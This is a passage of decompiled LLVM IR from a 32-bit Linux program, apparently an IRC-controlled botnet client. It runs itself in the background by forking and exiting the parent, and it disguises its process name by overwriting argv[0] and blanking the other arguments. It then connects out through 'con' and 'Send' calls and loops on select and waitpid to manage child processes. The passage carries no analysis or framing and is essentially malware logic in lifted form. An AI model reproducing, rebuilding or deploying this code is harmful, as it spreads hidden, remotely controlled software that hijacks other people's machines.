  %v3_80496e5 = call i32 @feof(i32* %tmp132)
  store i32 %v3_80496e5, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_80496ed = icmp eq i32 %v3_80496e5, 0
  br i1 %v1_80496ed, label %dec_label_pc_80496a5, label %dec_label_pc_80496f1

dec_label_pc_80496f1:                             ; preds = %dec_label_pc_80496df
  %v4_80496f1 = icmp eq i32 %stack_var_-60.0.ph, 0
  %v1_80496f5 = icmp eq i1 %v4_80496f1, false
  store i1 %v5_80496df, i1* %cf.global-to-local, align 1
  store i8* %v8_80496e2, i8** %stack_var_-6864, align 4
  %tmp134 = inttoptr i32 %stack_var_-80.0 to i16*
  %v3_804974c = call i32 @__GI_fclose(i16* %tmp134)
  store i32 %v3_804974c, i32* @eax, align 4
  %v0_8049751 = load i32, i32* @esp, align 4
  %v2_8049751 = icmp ugt i32 %v0_8049751, -17
  store i1 %v2_8049751, i1* %cf.global-to-local, align 1
  br i1 %v1_80496f5, label %dec_label_pc_8049764, label %dec_label_pc_80496f7

dec_label_pc_80496f7:                             ; preds = %dec_label_pc_80496f1
  store i1 %v5_8049584, i1* %cf.global-to-local, align 1
  store i32 %v3_804970d10, i32* %tmp129, align 4
  %v3_8049710 = call i32 @__GI_fopen(i32 %v3_804970d10, i32 ptrtoint (i32* @global_var_8051242.294 to i32))
  store i32 %v3_8049710, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804971b = icmp eq i32 %v3_8049710, 0
  br i1 %v4_804971b, label %dec_label_pc_8049764, label %dec_label_pc_8049721

dec_label_pc_8049721:                             ; preds = %dec_label_pc_80496f7
  store i1 %v5_8049584, i1* %cf.global-to-local, align 1
  store i32 %v2_8049694, i32* %eax.global-to-local, align 4
  store i8* %tmp131, i8** %stack_var_-6864, align 4
  %v3_804972e = call i32 @__GI_fputs(i32 %v2_8049694, i32 %v3_8049710)
  store i32 %v3_804972e, i32* @eax, align 4
  store i1 %v5_80496df, i1* %cf.global-to-local, align 1
  %v8_8049739 = inttoptr i32 %v3_8049710 to i8*
  store i8* %v8_8049739, i8** %stack_var_-6864, align 4
  %tmp135 = inttoptr i32 %v3_8049710 to i16*
  %v3_804973c = call i32 @__GI_fclose(i16* %tmp135)
  store i32 %v3_804973c, i32* %eax.global-to-local, align 4
  %v0_8049741 = load i32, i32* @esp, align 4
  %v2_8049741 = icmp ugt i32 %v0_8049741, -17
  store i1 %v2_8049741, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8049764

dec_label_pc_8049756:                             ; preds = %dec_label_pc_80495c7
  %v0_8049756 = load i32, i32* @esp, align 4
  %v5_8049756 = icmp ult i32 %v0_8049756, 12
  store i1 %v5_8049756, i1* %cf.global-to-local, align 1
  %v8_8049759 = inttoptr i32 %stack_var_-80.0 to i8*
  store i8* %v8_8049759, i8** %stack_var_-6864, align 4
  %tmp136 = inttoptr i32 %stack_var_-80.0 to i16*
  %v3_804975c = call i32 @__GI_fclose(i16* %tmp136)
  store i32 %v3_804975c, i32* %eax.global-to-local, align 4
  %v0_8049761 = load i32, i32* @esp, align 4
  %v2_8049761 = icmp ugt i32 %v0_8049761, -17
  store i1 %v2_8049761, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8049764

dec_label_pc_8049764:                             ; preds = %dec_label_pc_80496f1, %dec_label_pc_80496f7, %dec_label_pc_80495bd, %dec_label_pc_8049721, %dec_label_pc_8049756
  %v0_8049764 = call i32 @__libc_fork()
  store i32 %v0_8049764, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8049769 = icmp eq i32 %v0_8049764, 0
  br i1 %v1_8049769, label %dec_label_pc_8049777, label %dec_label_pc_804976d

dec_label_pc_804976d:                             ; preds = %dec_label_pc_8049764
  %v0_804976d = load i32, i32* @esp, align 4
  %v5_804976d = icmp ult i32 %v0_804976d, 12
  store i1 %v5_804976d, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-6864, align 4
  %v2_8049772 = call i32 @__GI_exit(i32 0)
  store i32 %v2_8049772, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8049777

dec_label_pc_8049777:                             ; preds = %dec_label_pc_8049764, %dec_label_pc_804976d
  store i32 %v2_8049552, i32* %edx.global-to-local, align 4
  %v3_804977d = load i32, i32* %v2_8049575, align 4
  store i32 %v3_804977d, i32* %eax.global-to-local, align 4
  %v1_8049780 = inttoptr i32 %v3_804977d to i32*
  %v2_8049780 = load i32, i32* %v1_8049780, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_804978d = and i32 %v2_8049780, -256
  store i32 %v1_804978d, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  %v4_8049790 = inttoptr i32 %v2_8049780 to i8*
  store i32 %v2_8049780, i32* @edi, align 4
  %v3_8049796 = call i32 @_strlen(i8* %v4_8049790)
  %v4_8049796 = mul i32 %v3_8049796, -1
  %v1_804979a = sub i32 1, %v4_8049796
  store i32 %v1_804979a, i32* %eax.global-to-local, align 4
  %v1_804979c = sub i32 0, %v4_8049796
  store i32 %v1_804979c, i32* %edx.global-to-local, align 4
  store i32 %v2_8049552, i32* %ecx.global-to-local, align 4
  %v3_80497a5 = load i32, i32* %v2_8049575, align 4
  store i32 %v3_80497a5, i32* %eax.global-to-local, align 4
  %v1_80497a8 = inttoptr i32 %v3_80497a5 to i32*
  %v2_80497a8 = load i32, i32* %v1_80497a8, align 4
  store i32 %v2_80497a8, i32* %eax.global-to-local, align 4
  %v0_80497aa = load i32, i32* @esp, align 4
  %v5_80497aa = icmp ult i32 %v0_80497aa, 4
  store i1 %v5_80497aa, i1* %cf.global-to-local, align 1
  %v5_80497b3 = inttoptr i32 %v2_80497a8 to i8*
  store i8* %v5_80497b3, i8** %stack_var_-6864, align 4
  %v5_80497b4 = call i32 @strncpy(i8* %v5_80497b3, i32 ptrtoint ([14 x i8]* @global_var_8051244.295 to i32), i32 %v1_804979c)
  store i32 1, i32* %eax.global-to-local, align 4
  store i32 %v2_8049552, i32* @esi, align 4
  %v3_8049819194 = load i32, i32* %stack_var_4, align 4
  %v9_8049819195 = icmp ugt i32 %v3_8049819194, 1
  store i1 %v9_8049819195, i1* %cf.global-to-local, align 1
  %v5_804981b197 = icmp sgt i32 %v3_8049819194, 1
  br i1 %v5_804981b197, label %dec_label_pc_80497c5, label %dec_label_pc_804981d

dec_label_pc_80497c5:                             ; preds = %dec_label_pc_8049777, %dec_label_pc_80497c5
  %storemerge17198 = phi i32 [ %v4_804980d, %dec_label_pc_80497c5 ], [ 1, %dec_label_pc_8049777 ]
  %v2_80497c8 = mul i32 %storemerge17198, 4
  store i32 %v2_80497c8, i32* %eax.global-to-local, align 4
  %v4_80497d1 = load i32, i32* %v2_8049575, align 4
  %v5_80497d1 = add i32 %v4_80497d1, %v2_80497c8
  %v10_80497d1 = icmp ult i32 %v5_80497d1, %v2_80497c8
  store i1 %v10_80497d1, i1* %cf.global-to-local, align 1
  store i32 %v5_80497d1, i32* %eax.global-to-local, align 4
  %v1_80497d4 = inttoptr i32 %v5_80497d1 to i32*
  %v2_80497d4 = load i32, i32* %v1_80497d4, align 4
  store i32 -1, i32* %ecx.global-to-local, align 4
  %v1_80497e1 = and i32 %v2_80497d4, -256
  store i32 %v1_80497e1, i32* %eax.global-to-local, align 4
  %v4_80497e4 = inttoptr i32 %v2_80497d4 to i8*
  %v3_80497ea = call i32 @_strlen(i8* %v4_80497e4)
  store i32 %v3_80497ea, i32* %edx.global-to-local, align 4
  store i32 %v2_80497c8, i32* %eax.global-to-local, align 4
  store i32 %v2_8049552, i32* %ecx.global-to-local, align 4
  %v4_80497ff = load i32, i32* %v2_8049575, align 4
  %v5_80497ff = add i32 %v4_80497ff, %v2_80497c8
  %v10_80497ff = icmp ult i32 %v5_80497ff, %v2_80497c8
  store i1 %v10_80497ff, i1* %cf.global-to-local, align 1
  store i32 %v5_80497ff, i32* %eax.global-to-local, align 4
  %v1_8049802 = inttoptr i32 %v5_80497ff to i32*
  %v2_8049802 = load i32, i32* %v1_8049802, align 4
  %v1_8049804 = inttoptr i32 %v2_8049802 to i8*
  store i32 %v2_8049802, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  store i32 %v3_80497ea, i32* %ecx.global-to-local, align 4
  %v1_8049809 = and i32 %v2_8049802, -256
  store i32 %v1_8049809, i32* %eax.global-to-local, align 4
  %v5_804980b = call i8* @_memset(i8* %v1_8049804, i32 %v1_8049809, i32 %v3_80497ea)
  %v6_804980b = ptrtoint i8* %v5_804980b to i32
  store i32 %v6_804980b, i32* %ecx.global-to-local, align 4
  %v4_804980d = add i32 %storemerge17198, 1
  store i32 %v4_804980d, i32* %eax.global-to-local, align 4
  store i32 %v2_8049552, i32* @esi, align 4
  %v3_8049819 = load i32, i32* %stack_var_4, align 4
  %v9_8049819 = icmp ult i32 %v4_804980d, %v3_8049819
  store i1 %v9_8049819, i1* %cf.global-to-local, align 1
  %v5_804981b = icmp slt i32 %v4_804980d, %v3_8049819
  br i1 %v5_804981b, label %dec_label_pc_80497c5, label %dec_label_pc_8049810.dec_label_pc_804981d_crit_edge

dec_label_pc_8049810.dec_label_pc_804981d_crit_edge: ; preds = %dec_label_pc_80497c5
  %v0_804981d.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804981d

dec_label_pc_804981d:                             ; preds = %dec_label_pc_8049810.dec_label_pc_804981d_crit_edge, %dec_label_pc_8049777
  %v0_804981d = phi i32 [ %v0_804981d.pre, %dec_label_pc_8049810.dec_label_pc_804981d_crit_edge ], [ %v15_8049563, %dec_label_pc_8049777 ]
  %stack_var_-6836.0.lcssa = phi i32 [ %v2_80497d4, %dec_label_pc_8049810.dec_label_pc_804981d_crit_edge ], [ %tmp93, %dec_label_pc_8049777 ]
  %v5_804981d = icmp ult i32 %v0_804981d, 12
  store i1 %v5_804981d, i1* %cf.global-to-local, align 1
  store i8* null, i8** %stack_var_-6864, align 4
  %v3_8049822 = call i32 @__GI_time(i32* null)
  store i32 %v3_8049822, i32* %eax.global-to-local, align 4
  %v0_8049827 = load i32, i32* @esp, align 4
  %v2_8049827 = icmp ugt i32 %v0_8049827, -17
  store i1 %v2_8049827, i1* %cf.global-to-local, align 1
  store i32 %v3_8049822, i32* @ebx, align 4
  %v0_804982c = call i32 @__libc_getpid()
  store i32 %v0_804982c, i32* %eax.global-to-local, align 4
  %v0_8049831 = load i32, i32* @ebx, align 4
  %v2_8049831 = xor i32 %v0_8049831, %v0_804982c
  store i1 false, i1* %cf.global-to-local, align 1
  store i32 %v2_8049831, i32* @ebx, align 4
  %v0_8049833 = load i8*, i8** %stack_var_-6864, align 4
  %v1_8049833 = ptrtoint i8* %v0_8049833 to i32
  %v2_8049833 = call i32 @getppid(i32 %v1_8049833)
  %v0_8049838 = load i32, i32* @ebx, align 4
  %v2_8049838 = add i32 %v0_8049838, %v2_8049833
  store i32 %v2_8049838, i32* @eax, align 4
  %v0_804983b = load i32, i32* @esp, align 4
  %v5_804983b = icmp ult i32 %v0_804983b, 12
  store i1 %v5_804983b, i1* %cf.global-to-local, align 1
  %v5_804983e = inttoptr i32 %v2_8049838 to i8*
  store i8* %v5_804983e, i8** %stack_var_-6864, align 4
  %v2_804983f = call i32 @srand(i32 %v2_8049838)
  store i32 %v2_804983f, i32* @eax, align 4
  %v0_8049844 = load i32, i32* @esp, align 4
  %v2_8049844 = icmp ugt i32 %v0_8049844, -17
  store i1 %v2_8049844, i1* %cf.global-to-local, align 1
  %v2_804984e = call i32 @makestring(i32 ptrtoint ([14 x i8]* @global_var_80511ed.283 to i32))
  %v0_8049856 = load i32, i32* @esp, align 4
  %v5_8049856 = icmp ult i32 %v0_8049856, 8
  store i1 %v5_8049856, i1* %cf.global-to-local, align 1
  %v2_804985c = ptrtoint i32* %stack_var_-398 to i32
  store i32 %v2_804985c, i32* @eax, align 4
  %tmp137 = bitcast i32* %stack_var_-398 to i8*
  store i8* %tmp137, i8** %stack_var_-6864, align 4
  %v4_8049863 = call i32 @strcpy(i8* %tmp137, i32 ptrtoint ([14 x i8]* @global_var_80511ed.283 to i32))
  store i1 %v5_8049584, i1* %cf.global-to-local, align 1
  store i32 %v2_804985c, i32* %eax.global-to-local, align 4
  store i8* %tmp137, i8** %stack_var_-6864, align 4
  %v4_8049878 = call i32 @strcat(i8* %tmp137, i32 %v2_804984e)
  %v0_804987d = load i32, i32* @esp, align 4
  %v2_804987d = icmp ugt i32 %v0_804987d, -17
  store i1 %v2_804987d, i1* %cf.global-to-local, align 1
  store i32 %v2_804985c, i32* @eax, align 4
  store i32 %v2_804985c, i32* @global_var_8056a10.268, align 16
  %v0_804988b = load i8*, i8** %stack_var_-6864, align 4
  %v1_804988b = ptrtoint i8* %v0_804988b to i32
  %v2_804988b = call i32 @makestring(i32 %v1_804988b)
  store i32 %v2_804988b, i32* @eax, align 4
  store i32 %v2_804988b, i32* @global_var_8056a08.260, align 8
  %v0_8049895 = load i8*, i8** %stack_var_-6864, align 4
  %v1_8049895 = ptrtoint i8* %v0_8049895 to i32
  %v2_8049895 = call i32 @makestring(i32 %v1_8049895)
  store i32 %v2_8049895, i32* %eax.global-to-local, align 4
  store i32 %v2_8049895, i32* @global_var_8056a18.296, align 8
  store i32 ptrtoint (i32* @global_var_8051252.297 to i32), i32* @global_var_8056a28.263, align 8
  store i32 ptrtoint (i32* @global_var_8051254.298 to i32), i32* @global_var_8056a24.274, align 4
  store i32 ptrtoint (i32* @global_var_8051254.298 to i32), i32* @global_var_8056a0c.299, align 4
  store i32 0, i32* @global_var_8056a1c.289, align 4
  %v2_8049922 = ptrtoint i32* %stack_var_-664 to i32
  %tmp138 = bitcast i32* %stack_var_-664 to i8*
  %v2_804996a = ptrtoint i32* %stack_var_-408 to i32
  %v2_8049ace = ptrtoint i32* %stack_var_-6808 to i32
  %v2_8049b9e = ptrtoint i32* %stack_var_-2712 to i32
  %v2_8049bf5 = ptrtoint i32* %stack_var_-1688 to i32
  %tmp139 = bitcast i8** %stack_var_-32 to i32*
  br label %dec_label_pc_80498c9

dec_label_pc_80498c9:                             ; preds = %dec_label_pc_8049ac2, %dec_label_pc_8049918, %dec_label_pc_8049c78, %dec_label_pc_804981d
  %stack_var_-6840.0 = phi i8* [ %tmp82, %dec_label_pc_804981d ], [ %stack_var_-6840.2.ph, %dec_label_pc_8049c78 ], [ %stack_var_-6840.1.ph.ph146, %dec_label_pc_8049918 ], [ %stack_var_-6840.1.ph.ph146, %dec_label_pc_8049ac2 ]
  %stack_var_-40.0 = phi i32 [ %tmp85, %dec_label_pc_804981d ], [ %stack_var_-40.3.lcssa, %dec_label_pc_8049c78 ], [ %stack_var_-40.1, %dec_label_pc_8049918 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_8049ac2 ]
  %v0_80498c9 = call i32 @con()
  %v0_80498ce = load i32, i32* @global_var_8056a0c.299, align 4
  store i32 %v0_80498ce, i32* %eax.global-to-local, align 4
  %v0_80498d3 = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_80498d3, i32* %edx.global-to-local, align 4
  %v0_80498d9 = load i32, i32* @esp, align 4
  %v5_80498d9 = icmp ult i32 %v0_80498d9, 4
  store i1 %v5_80498d9, i1* %cf.global-to-local, align 1
  %v2_80498dc = add i32 %v0_80498d9, -8
  %v3_80498dc = inttoptr i32 %v2_80498dc to i32*
  store i32 %v0_80498ce, i32* %v3_80498dc, align 4
  %v1_80498dd = add i32 %v0_80498d9, -12
  %v2_80498dd = inttoptr i32 %v1_80498dd to i32*
  store i32 ptrtoint ([9 x i8]* @global_var_8051255.300 to i32), i32* %v2_80498dd, align 4
  %v0_80498e2 = load i32, i32* %edx.global-to-local, align 4
  %v2_80498e2 = add i32 %v0_80498d9, -16
  %v3_80498e2 = inttoptr i32 %v2_80498e2 to i32*
  store i32 %v0_80498e2, i32* %v3_80498e2, align 4
  %v0_80498e3 = load i8*, i8** %stack_var_-6864, align 4
  %v1_80498e3 = ptrtoint i8* %v0_80498e3 to i32
  %v4_80498e3 = call i32 @Send(i32 %v1_80498e3, i32 %v2_804984e, i32 %v1_804979c)
  %v0_80498e8 = load i32, i32* @esp, align 4
  %v1_80498e8 = add i32 %v0_80498e8, 16
  %v0_80498eb = load i32, i32* @global_var_8056a18.296, align 8
  store i32 %v0_80498eb, i32* %eax.global-to-local, align 4
  %v0_80498f0 = load i32, i32* @global_var_8056a08.260, align 8
  store i32 %v0_80498f0, i32* %edx.global-to-local, align 4
  %v0_80498f6 = load i32, i32* @global_var_8056a10.268, align 16
  store i32 %v0_80498f6, i32* %ecx.global-to-local, align 4
  %v0_80498fc = load i32, i32* @global_var_8056a14.284, align 4
  store i32 %v0_80498fc, i32* @ebx, align 4
  %v5_8049902 = icmp ult i32 %v1_80498e8, 12
  store i1 %v5_8049902, i1* %cf.global-to-local, align 1
  %v3_8049905 = inttoptr i32 %v0_80498e8 to i32*
  store i32 %v0_80498eb, i32* %v3_8049905, align 4
  %v0_8049906 = load i32, i32* %edx.global-to-local, align 4
  %v2_8049906 = add i32 %v0_80498e8, -4
  %v3_8049906 = inttoptr i32 %v2_8049906 to i32*
  store i32 %v0_8049906, i32* %v3_8049906, align 4
  %v0_8049907 = load i32, i32* %ecx.global-to-local, align 4
  %v2_8049907 = add i32 %v0_80498e8, -8
  %v3_8049907 = inttoptr i32 %v2_8049907 to i32*
  store i32 %v0_8049907, i32* %v3_8049907, align 4
  %v1_8049908 = add i32 %v0_80498e8, -12
  %v2_8049908 = inttoptr i32 %v1_8049908 to i32*
  store i32 ptrtoint ([41 x i8]* @global_var_8051260.301 to i32), i32* %v2_8049908, align 4
  %v0_804990d = load i32, i32* @ebx, align 4
  %v2_804990d = add i32 %v0_80498e8, -16
  %v3_804990d = inttoptr i32 %v2_804990d to i32*
  store i32 %v0_804990d, i32* %v3_804990d, align 4
  %v0_804990e = load i8*, i8** %stack_var_-6864, align 4
  %v1_804990e = ptrtoint i8* %v0_804990e to i32
  %v4_804990e = call i32 @Send(i32 %v1_804990e, i32 %v2_804984e, i32 %v1_804979c)
  store i32 %v4_804990e, i32* %eax.global-to-local, align 4
  %v0_8049913 = load i32, i32* @esp, align 4
  %v2_8049913 = icmp ugt i32 %v0_8049913, -33
  store i1 %v2_8049913, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_8049918.outer.outer

dec_label_pc_8049918.outer.outer:                 ; preds = %dec_label_pc_8049c97, %dec_label_pc_8049cb6, %dec_label_pc_80498c9
  %stack_var_-6840.1.ph.ph146 = phi i8* [ %stack_var_-6840.0, %dec_label_pc_80498c9 ], [ %stack_var_-6840.338, %dec_label_pc_8049cb6 ], [ %stack_var_-6840.2.ph, %dec_label_pc_8049c97 ]
  %stack_var_-40.1.ph.ph = phi i32 [ %stack_var_-40.0, %dec_label_pc_80498c9 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_8049cb6 ], [ %stack_var_-40.3.lcssa, %dec_label_pc_8049c97 ]
  br label %dec_label_pc_8049918.outer

dec_label_pc_8049918.outer:                       ; preds = %dec_label_pc_8049918.outer.outer, %dec_label_pc_8049aeb
  %stack_var_-40.1.ph = phi i32 [ %stack_var_-40.3.lcssa, %dec_label_pc_8049aeb ], [ %stack_var_-40.1.ph.ph, %dec_label_pc_8049918.outer.outer ]
  br label %dec_label_pc_8049918

dec_label_pc_8049918:                             ; preds = %dec_label_pc_8049918.outer, %dec_label_pc_8049a9d
  %stack_var_-40.1 = phi i32 [ %stack_var_-40.3.lcssa, %dec_label_pc_8049a9d ], [ %stack_var_-40.1.ph, %dec_label_pc_8049918.outer ]
  store i32 0, i32* %eax.global-to-local, align 4
  store i32 32, i32* %ecx.global-to-local, align 4
  store i32 %v2_8049922, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v5_8049929 = call i8* @_memset(i8* %tmp138, i32 0, i32 32)
  %v6_8049929 = ptrtoint i8* %v5_8049929 to i32
  store i32 %v6_8049929, i32* %ecx.global-to-local, align 4
  %v0_8049931 = load i32, i32* @global_var_8056a14.284, align 4
  %v2_8049938 = udiv i32 %v0_8049931, 32
  store i32 %v2_8049938, i32* %edx.global-to-local, align 4
  %v1_8049940 = urem i32 %v0_8049931, 32
  store i32 %v1_8049940, i32* %eax.global-to-local, align 4
  %v0_8049943 = load i32, i32* @ebp, align 4
  %v2_8049943 = mul nuw nsw i32 %v2_8049938, 4
  %v3_8049943 = add nsw i32 %v2_8049943, -656
  %v4_8049943 = add i32 %v3_8049943, %v0_8049943
  %v5_8049943 = inttoptr i32 %v4_8049943 to i32*
  %v6_8049943 = load i32, i32* %v5_8049943, align 4
  %v9_8049943 = shl i32 1, %v1_8049940
  %v12_8049943 = or i32 %v6_8049943, %v9_8049943
  store i32 %v12_8049943, i32* %v5_8049943, align 4
  store i32 1200, i32* %stack_var_-408, align 4
  %v0_804995f = load i32, i32* @global_var_8056a14.284, align 4
  %v1_8049964 = add i32 %v0_804995f, 1
  store i32 %v1_8049964, i32* %edx.global-to-local, align 4
  %v0_8049967 = load i32, i32* @esp, align 4
  %v5_8049967 = icmp ult i32 %v0_8049967, 12
  store i1 %v5_8049967, i1* %cf.global-to-local, align 1
  %v2_8049970 = add i32 %v0_8049967, -16
  %v3_8049970 = inttoptr i32 %v2_8049970 to i32*
  store i32 %v2_804996a, i32* %v3_8049970, align 4
  %v1_8049971 = add i32 %v0_8049967, -20
  %v2_8049971 = inttoptr i32 %v1_8049971 to i32*
  store i32 0, i32* %v2_8049971, align 4
  %v1_8049973 = add i32 %v0_8049967, -24
  %v2_8049973 = inttoptr i32 %v1_8049973 to i32*
  store i32 0, i32* %v2_8049973, align 4
  store i32 %v2_8049922, i32* %eax.global-to-local, align 4
  %v2_804997b = add i32 %v0_8049967, -28
  %v3_804997b = inttoptr i32 %v2_804997b to i32*
  store i32 %v2_8049922, i32* %v3_804997b, align 4
  %v0_804997c = load i32, i32* %edx.global-to-local, align 4
  %v2_804997c = add i32 %v0_8049967, -32
  %v3_804997c = inttoptr i32 %v2_804997c to i32*
  store i32 %v0_804997c, i32* %v3_804997c, align 4
  %v0_804997d = load i32, i32* %stack_var_-408, align 4
  %v5_804997d = call i32 @__libc_select(i32 %v0_804997d, i32 0, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804997d, i32* %eax.global-to-local, align 4
  %v0_8049982 = load i32, i32* @esp, align 4
  %v1_8049982 = add i32 %v0_8049982, 32
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp140 = icmp slt i32 %v5_804997d, 1
  br i1 %tmp140, label %dec_label_pc_80498c9, label %dec_label_pc_8049a8f.preheader

dec_label_pc_8049a8f.preheader:                   ; preds = %dec_label_pc_8049918
  %v0_8049a8f176 = load i32, i32* @global_var_8054390.256, align 16
  store i32 %v0_8049a8f176, i32* %eax.global-to-local, align 4
  %v10_8049a94177 = icmp ne i32 %v0_8049a8f176, 0
  store i1 %v10_8049a94177, i1* %cf.global-to-local, align 1
  br i1 %v10_8049a94177, label %dec_label_pc_8049999, label %dec_label_pc_8049a9d

dec_label_pc_8049999:                             ; preds = %dec_label_pc_8049a8f.preheader, %dec_label_pc_8049a8c
  %storemerge14181 = phi i32 [ %.pre, %dec_label_pc_8049a8c ], [ 0, %dec_label_pc_8049a8f.preheader ]
  %stack_var_-40.3180 = phi i32 [ %stack_var_-40.2, %dec_label_pc_8049a8c ], [ %stack_var_-40.1, %dec_label_pc_8049a8f.preheader ]
  %v0_80499ab179 = phi i32 [ %v0_8049ac753, %dec_label_pc_8049a8c ], [ %v1_8049982, %dec_label_pc_8049a8f.preheader ]
  %v2_804999c = mul i32 %storemerge14181, 4
  store i32 %v2_804999c, i32* %edx.global-to-local, align 4
  %v0_80499a1 = load i32, i32* @global_var_8056a2c.257, align 4
  %v2_80499a6 = add i32 %v0_80499a1, %v2_804999c
  store i32 %v2_80499a6, i32* %eax.global-to-local, align 4
  %v1_80499a9 = inttoptr i32 %v2_80499a6 to i32*
  %v2_80499a9 = load i32, i32* %v1_80499a9, align 4
  store i32 %v2_80499a9, i32* %eax.global-to-local, align 4
  %v5_80499ab = icmp ult i32 %v0_80499ab179, 4
  store i1 %v5_80499ab, i1* %cf.global-to-local, align 1
  %v1_80499ae = add i32 %v0_80499ab179, -8
  %v2_80499ae = inttoptr i32 %v1_80499ae to i32*
  store i32 1, i32* %v2_80499ae, align 4
  %v1_80499b0 = add i32 %v0_80499ab179, -12
  %v2_80499b0 = inttoptr i32 %v1_80499b0 to i32*
  store i32 0, i32* %v2_80499b0, align 4
  %v0_80499b2 = load i32, i32* %eax.global-to-local, align 4
  %v2_80499b2 = add i32 %v0_80499ab179, -16
  %v3_80499b2 = inttoptr i32 %v2_80499b2 to i32*
  store i32 %v0_80499b2, i32* %v3_80499b2, align 4
  %v0_80499b3 = call i32 @__libc_waitpid()
  store i32 %v0_80499b3, i32* %eax.global-to-local, align 4
  %v0_80499b8 = load i32, i32* @esp, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp141 = icmp slt i32 %v0_80499b3, 1
  %.pre = add i32 %storemerge14181, 1
  br i1 %tmp141, label %dec_label_pc_8049a8c, label %dec_label_pc_80499c3

dec_label_pc_80499c3:                             ; preds = %dec_label_pc_8049999
  %v0_80499f6161 = load i32, i32* @global_var_8054390.256, align 16
  %v10_80499fb162 = icmp ult i32 %.pre, %v0_80499f6161
  %v2_80499cf163 = mul i32 %.pre, 4
  store i32 %v2_80499cf163, i32* %edx.global-to-local, align 4
  %v0_80499d4164 = load i32, i32* @global_var_8056a2c.257, align 4
  %v2_80499d9165 = add i32 %v0_80499d4164, %v2_80499cf163
  store i32 %v2_80499d9165, i32* %eax.global-to-local, align 4
  %v1_80499dc166 = add i32 %v2_80499d9165, -4
  br i1 %v10_80499fb162, label %dec_label_pc_80499cc, label %dec_label_pc_8049a00

dec_label_pc_80499cc:                             ; preds = %dec_label_pc_80499c3, %dec_label_pc_80499cc
  %v1_80499dc170 = phi i32 [ %v1_80499dc, %dec_label_pc_80499cc ], [ %v1_80499dc166, %dec_label_pc_80499c3 ]
  %v2_80499d9169 = phi i32 [ %v2_80499d9, %dec_label_pc_80499cc ], [ %v2_80499d9165, %dec_label_pc_80499c3 ]
  %v2_80499cf168 = phi i32 [ %v2_80499cf, %dec_label_pc_80499cc ], [ %v2_80499cf163, %dec_label_pc_80499c3 ]
  %storemerge16167 = phi i32 [ %v4_80499f3, %dec_label_pc_80499cc ], [ %.pre, %dec_label_pc_80499c3 ]
  store i32 %v1_80499dc170, i32* %ecx.global-to-local, align 4
  store i32 %v2_80499cf168, i32* %edx.global-to-local, align 4
  store i32 %v2_80499d9169, i32* %eax.global-to-local, align 4
  %v1_80499ef = inttoptr i32 %v2_80499d9169 to i32*
  %v2_80499ef = load i32, i32* %v1_80499ef, align 4
  %v2_80499f1 = inttoptr i32 %v1_80499dc170 to i32*
  store i32 %v2_80499ef, i32* %v2_80499f1, align 4
  %v4_80499f3 = add i32 %storemerge16167, 1
  %v0_80499f6 = load i32, i32* @global_var_8054390.256, align 16
  %v10_80499fb = icmp ult i32 %v4_80499f3, %v0_80499f6
  %v2_80499cf = mul i32 %v4_80499f3, 4
  store i32 %v2_80499cf, i32* %edx.global-to-local, align 4
  %v0_80499d4 = load i32, i32* @global_var_8056a2c.257, align 4
  %v2_80499d9 = add i32 %v0_80499d4, %v2_80499cf
  store i32 %v2_80499d9, i32* %eax.global-to-local, align 4
  %v1_80499dc = add i32 %v2_80499d9, -4
  br i1 %v10_80499fb, label %dec_label_pc_80499cc, label %dec_label_pc_8049a00

dec_label_pc_8049a00:                             ; preds = %dec_label_pc_80499cc, %dec_label_pc_80499c3
  %storemerge16.lcssa = phi i32 [ %.pre, %dec_label_pc_80499c3 ], [ %v4_80499f3, %dec_label_pc_80499cc ]
  %v1_80499dc.lcssa = phi i32 [ %v1_80499dc166, %dec_label_pc_80499c3 ], [ %v1_80499dc, %dec_label_pc_80499cc ]
  %v1_8049a13 = inttoptr i32 %v1_80499dc.lcssa to i32*
  store i32 0, i32* %v1_8049a13, align 4
  %v0_8049a19 = load i32, i32* @global_var_8054390.256, align 16
  %v1_8049a1e = add i32 %v0_8049a19, -1
  store i32 %v1_8049a1e, i32* @global_var_8054390.256, align 16
  %v2_8049a29 = mul i32 %v1_8049a1e, 4
  %v1_8049a2c = add i32 %v2_8049a29, 4
  store i32 %v1_8049a2c, i32* %eax.global-to-local, align 4
  %v0_8049a2f = load i32, i32* @esp, align 4
  %v5_8049a2f = icmp ult i32 %v0_8049a2f, 12
  store i1 %v5_8049a2f, i1* %cf.global-to-local, align 1
  %v2_8049a32 = add i32 %v0_8049a2f, -16
  %v3_8049a32 = inttoptr i32 %v2_8049a32 to i32*
  store i32 %v1_8049a2c, i32* %v3_8049a32, align 4
  %v1_8049a33 = call i32 @malloc(i32 %storemerge16.lcssa)
  %v0_8049a38 = load i32, i32* @esp, align 4
  %v1_8049a38 = add i32 %v0_8049a38, 16
  %v2_8049a38 = icmp ugt i32 %v0_8049a38, -17
  store i1 %v2_8049a38, i1* %cf.global-to-local, align 1
  %v0_8049a69172 = load i32, i32* @global_var_8054390.256, align 16
  store i32 %v0_8049a69172, i32* %eax.global-to-local, align 4
  %v10_8049a6e173 = icmp eq i32 %v0_8049a69172, 0
  br i1 %v10_8049a6e173, label %dec_label_pc_8049a73, label %dec_label_pc_8049a47

dec_label_pc_8049a47:                             ; preds = %dec_label_pc_8049a00, %dec_label_pc_8049a47
  %storemerge15174 = phi i32 [ %v4_8049a66, %dec_label_pc_8049a47 ], [ 0, %dec_label_pc_8049a00 ]
